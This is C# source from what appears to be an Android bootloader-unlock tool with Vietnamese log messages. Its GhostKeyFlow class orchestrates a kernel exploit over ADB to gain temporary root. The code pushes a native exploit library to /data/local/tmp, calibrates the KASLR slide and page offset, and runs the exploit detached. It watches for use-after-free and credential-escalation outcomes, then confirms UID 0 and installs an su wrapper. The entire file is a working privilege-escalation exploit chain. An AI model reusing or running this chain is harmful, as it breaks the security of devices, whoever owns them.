using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MoKhoaBootloader.Core
{
    public sealed class GhostKeyFlow
    {
        private const string Work = "/data/local/tmp/cve98260";
        private const string Binary = Work + "/libcve98260.so";
        private readonly IAdbShell adb;
        private readonly string logDirectory;
        private readonly SemaphoreSlim runLock = new SemaphoreSlim(1, 1);
        public event Action<string> LogEvent;
        public string LastLogPath { get; private set; }

        public GhostKeyFlow(IAdbShell runner, string logDirectory = null)
        {
            adb = runner;
            this.logDirectory = logDirectory ?? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "MoKhoaBootloader_HyperOS4", "logs");
        }

        private void Log(string message)
        {
            if (string.IsNullOrWhiteSpace(message)) return;
            if (LastLogPath != null)
            {
                try { File.AppendAllText(LastLogPath, $"[{DateTime.Now:HH:mm:ss}] {message}\r\n", Encoding.UTF8); }
                catch (IOException) { }
                catch (UnauthorizedAccessException) { }
            }
            LogEvent?.Invoke(message);
        }

        public async Task<bool> RunNativeTempRootAsync(CancellationToken ct = default)
        {
            if (!await runLock.WaitAsync(0, ct)) return false;
            try
            {
                Directory.CreateDirectory(logDirectory);
                LastLogPath = Path.Combine(logDirectory, "temproot-" + DateTime.Now.ToString("yyyyMMdd-HHmmss-fff") + ".log");
                Log("[Temproot] Log: " + LastLogPath);
                return await RunChainAsync(ct);
            }
            catch (OperationCanceledException)
            {
                Log("[Temproot] Đã dừng theo dõi. Giữ nguyên native trên điện thoại; khởi động lại máy trước khi chạy lại.");
                throw;
            }
            catch (Exception ex)
            {
                Log("[Temproot LỖI] " + ex.Message);
                return false;
            }
            finally { runLock.Release(); }
        }

        private async Task<bool> RunChainAsync(CancellationToken ct)
        {
            string uid = await CaptureAsync("id -u", ct);
            if (uid != "2000" && uid != "0")
                throw new InvalidOperationException("ADB yêu cầu UID shell (2000) hoặc root (0). UID: " + uid);
            if (await adb.CheckRootAsync(ct))
            {
                Log("[Temproot] Đã có kênh root UID 0; dùng lại, bỏ qua khai thác.");
                return true;
            }

            string nativeSo = ResourceManager.GetFilePath("libcve98260.so");
            string blob = ResourceManager.GetFilePath("profile.blob");
            if (!File.Exists(nativeSo)) throw new FileNotFoundException("Thiếu libcve98260.so.", nativeSo);
            string release = NativeProtocol.ReadProfileRelease(blob);
            string actual = await CaptureAsync("uname -r", ct);
            Log("[Thiết bị] Kernel: " + actual + " | Profile: " + release);
            if (actual != release)
                throw new InvalidOperationException("Kernel không khớp profile của dash_boot_OS_4.0.3.img. Cần boot.img đúng bản kernel đang chạy.");
            string arch = await CaptureAsync("uname -m", ct);
            string pageSize = await CaptureAsync("getconf PAGESIZE", ct);
            Log("[Thiết bị] ABI: " + arch + " | Page size: " + pageSize);
            if (arch != "aarch64" || pageSize != "4096")
                throw new InvalidOperationException("Binary/profile hiện tại yêu cầu ARM64 và page size 4096.");
            string status = await CaptureAsync("cat /proc/self/status", ct);
            if (!System.Text.RegularExpressions.Regex.IsMatch(status, @"(?m)^Seccomp:\s*0\s*$"))
                throw new InvalidOperationException("ADB shell còn bộ lọc seccomp; chưa đủ điều kiện chạy native theo GhostKey.");

            // Never kill previous native holders: GhostKey requires reboot on residual processes.
            var residual = await adb.ShellAsync("pidof libcve98260.so uaf_plant timer_probe", 10000, ct);
            if (residual.ExitCode != 0 && residual.ExitCode != 1)
                throw new InvalidOperationException("Không kiểm tra được native cũ: " + residual.Output);
            if (!string.IsNullOrWhiteSpace(residual.Output))
                throw new InvalidOperationException("Còn native từ lần trước (PID " + residual.Output.Trim() + "). Khởi động lại điện thoại trước khi thử lại.");

            await RequireAsync("mkdir -p " + Work, ct);
            await PushAsync(nativeSo, Binary, ct);
            await PushAsync(blob, Work + "/profile.blob", ct);
            await RequireAsync("chmod 755 " + Binary + " && rm -f " + Work +
                "/slide.txt " + Work + "/page_offset.txt " + Work + "/page_offset.score", ct);

            Log("[1/4] calibrate-a: chờ tối đa 180 giây (theo GhostKey).");
            await RunStepAsync("calib-a", "calibrate-a", 180, ct);
            string slide = await ReadHexAsync("slide.txt", ct);
            Log("[calib_a] KASLR slide = " + slide);

            Log("[2/4] calibrate-b: chờ tối đa 240 giây.");
            await RunStepAsync("calib-b", "calibrate-b --slide " + slide, 240, ct);
            string pageOffset = await ReadHexAsync("page_offset.txt", ct);
            string score = await CaptureAsync("cat " + Work + "/page_offset.score", ct);
            Log("[calib_b] page_offset = " + pageOffset + " | confidence = " + score);
            if (score == "fallback") Log("[Cảnh báo] Native dùng page_offset dự phòng từ profile; chưa đo xác nhận được.");

            await WaitIdleAsync(ct);
            Log("[3/4] Khởi chạy native và chờ rootd, tối đa 300 giây.");
            await StartStepAsync("inject", "exploit --slide " + slide + " --page-offset " + pageOffset + " --daemon-exit", ct);
            var watch = Stopwatch.StartNew();
            string previous = "";
            bool ready = false;
            bool parentExited = false;
            while (watch.Elapsed.TotalSeconds < 300)
            {
                ct.ThrowIfCancellationRequested();
                string output = await ReadLogAsync("inject", ct);
                Relay(output, ref previous);
                if (output.Contains("C98260_ROOTD_READY=1")) { ready = true; break; }
                if (output.Contains("cred escalation not effective") || output.Contains("binding failed") ||
                    output.Contains("listen failed") || output.Contains("missed page; holding zombie") ||
                    output.Contains("leak failed")) break;
                int? injectExit = await ReadExitAsync("inject", ct);
                if (injectExit.HasValue && injectExit.Value != 0) break;
                if (injectExit == 0 && !parentExited)
                {
                    // --daemon-exit returns before the detached child finishes starting rootd.
                    parentExited = true;
                    Log("[inject] Native cha đã thoát 0 theo --daemon-exit; tiếp tục chờ rootd của tiến trình con.");
                }
                await Task.Delay(400, ct);
            }
            if (!ready)
            {
                Log(await ReadLogAsync("inject", ct));
                throw new InvalidOperationException("Rootd chưa sẵn sàng. Giữ nguyên native; khởi động lại máy trước khi thử lại. Xem log để biết lỗi cụ thể.");
            }

            Log("[4/4] Xác minh su -c id (tối đa 8 lần, mỗi lần 30 giây).");
            for (int attempt = 1; attempt <= 8; attempt++)
            {
                var result = await adb.ShellAsync(Binary + " su -c id", 30000, ct);
                Log($"[verify {attempt}/8] exit={result.ExitCode}: {result.Output.Trim()}");
                if (result.Ok && NativeProtocol.IsRoot(result.Output))
                {
                    await InstallWrapperAsync(ct);
                    if (!await adb.CheckRootAsync(ct))
                        throw new InvalidOperationException("Native trả UID 0 nhưng kênh su của tool chưa sử dụng được.");
                    Log("[Temproot THÀNH CÔNG] Đã xác nhận UID 0. Root tạm thời mất sau khi khởi động lại.");
                    return true;
                }
                await Task.Delay(1500, ct);
            }
            throw new InvalidOperationException("Rootd báo sẵn sàng nhưng su chưa trả UID 0. Không tiếp tục ghi LK.");
        }

        private async Task StartStepAsync(string name, string args, CancellationToken ct)
        {
            string env = "CVE98260_HOME=" + Work + " TMPDIR=" + Work + " HOME=" + Work +
                " PATH=/system/bin:/vendor/bin:/data/local/tmp PLANT_FAST=1";
            // Redirect all streams and detach: an ADB timeout must not kill native page holders.
            string body = "cd " + Work + " && " + env + " " + Binary + " " + args +
                " < " + Work + "/profile.blob; rc=$?; printf '%s\\n' \"$rc\" > " + Work + "/" + name + ".exit";
            await RequireAsync("rm -f " + Work + "/" + name + ".exit || exit; nohup sh -c " + NativeProtocol.QuoteShell(body) +
                " > " + Work + "/" + name + ".log 2>&1 < /dev/null &", ct);
        }

        private async Task RunStepAsync(string name, string args, int seconds, CancellationToken ct)
        {
            await StartStepAsync(name, args, ct);
            var watch = Stopwatch.StartNew();
            string previous = "";
            while (watch.Elapsed.TotalSeconds < seconds)
            {
                ct.ThrowIfCancellationRequested();
                Relay(await ReadLogAsync(name, ct), ref previous);
                int? exit = await ReadExitAsync(name, ct);
                if (exit != null)
                {
                    Relay(await ReadLogAsync(name, ct), ref previous);
                    // calib-b may return nonzero but write a documented profile fallback.
                    if (exit != 0 && name != "calib-b")
                        throw new InvalidOperationException(name + " thất bại, exit=" + exit + ".");
                    Log($"[{name}] exit={exit}");
                    return;
                }
                await Task.Delay(400, ct);
            }
            throw new TimeoutException(name + " hết thời gian chờ. Native được giữ nguyên; khởi động lại điện thoại trước khi chạy lại.");
        }

        private void Relay(string output, ref string previous)
        {
            if (output == previous) return;
            Log(output.StartsWith(previous, StringComparison.Ordinal) ? output.Substring(previous.Length).Trim() : output.Trim());
            previous = output;
        }

        private async Task<int?> ReadExitAsync(string name, CancellationToken ct)
        {
            var result = await adb.ShellAsync("if [ -f " + Work + "/" + name + ".exit ]; then cat " +
                Work + "/" + name + ".exit; fi", 10000, ct);
            if (!result.Ok) throw new IOException("Mất kết nối khi chờ " + name + ": " + result.Output);
            string value = result.Output.Trim();
            if (value.Length == 0) return null;
            if (!int.TryParse(value, out int code)) throw new InvalidDataException("Mã thoát native không hợp lệ: " + value);
            return code;
        }

        private async Task<string> ReadLogAsync(string name, CancellationToken ct) =>
            await CaptureAsync("if [ -f " + Work + "/" + name + ".log ]; then cat " + Work + "/" + name + ".log; fi", ct);

        private async Task<string> ReadHexAsync(string name, CancellationToken ct)
        {
            string value = await CaptureAsync("cat " + Work + "/" + name, ct);
            if (!NativeProtocol.IsHex(value)) throw new InvalidDataException("Kết quả " + name + " không phải địa chỉ hex hợp lệ: " + value);
            return value;
        }

        private async Task WaitIdleAsync(CancellationToken ct)
        {
            var watch = Stopwatch.StartNew();
            while (watch.Elapsed.TotalSeconds < 24)
            {
                string load = await CaptureAsync("cat /proc/loadavg", ct);
                var match = System.Text.RegularExpressions.Regex.Match(load, @"^\S+\s+\S+\s+\S+\s+(\d+)/\d+");
                if (!match.Success || (int.TryParse(match.Groups[1].Value, out int runnable) && runnable <= 10)) return;
                Log("[Temproot] Đợi tải máy giảm: " + load);
                await Task.Delay(3000, ct);
            }
        }

        private async Task InstallWrapperAsync(CancellationToken ct)
        {
            string local = Path.GetTempFileName();
            try
            {
                File.WriteAllText(local, NativeProtocol.BuildSuWrapper(Binary), new UTF8Encoding(false));
                await PushAsync(local, "/data/local/tmp/su", ct);
                await RequireAsync("chmod 755 /data/local/tmp/su", ct);
            }
            finally { File.Delete(local); }
        }

        private async Task PushAsync(string local, string remote, CancellationToken ct)
        {
            var result = await adb.PushAsync(local, remote, 60000, ct);
            if (!result.Ok) throw new IOException("Đẩy file thất bại: " + remote + "\n" + result.Output);
        }

        private async Task RequireAsync(string command, CancellationToken ct) { await CaptureAsync(command, ct); }

        private async Task<string> CaptureAsync(string command, CancellationToken ct)
        {
            var result = await adb.ShellAsync(command, 10000, ct);
            if (!result.Ok) throw new IOException($"Lệnh thất bại (exit={result.ExitCode}): {command}\n{result.Output}");
            return result.Output.Trim();
        }
    }
}
